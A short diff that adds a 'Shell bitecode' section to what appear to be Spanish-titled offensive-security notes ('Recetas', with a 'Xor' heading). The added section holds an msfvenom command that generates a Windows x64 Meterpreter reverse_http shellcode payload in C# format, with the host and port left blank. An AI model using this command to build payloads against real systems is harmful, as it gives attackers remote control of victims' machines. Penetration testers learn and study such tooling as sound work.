@@ -1,3 +1,7 @@
+# Shell bitecode
+
+    msfvenom -p windows/x64/meterpreter/reverse_http LHOST=... LPORT=... -f csharp
+
 # Recetas:
 
 ### Xor
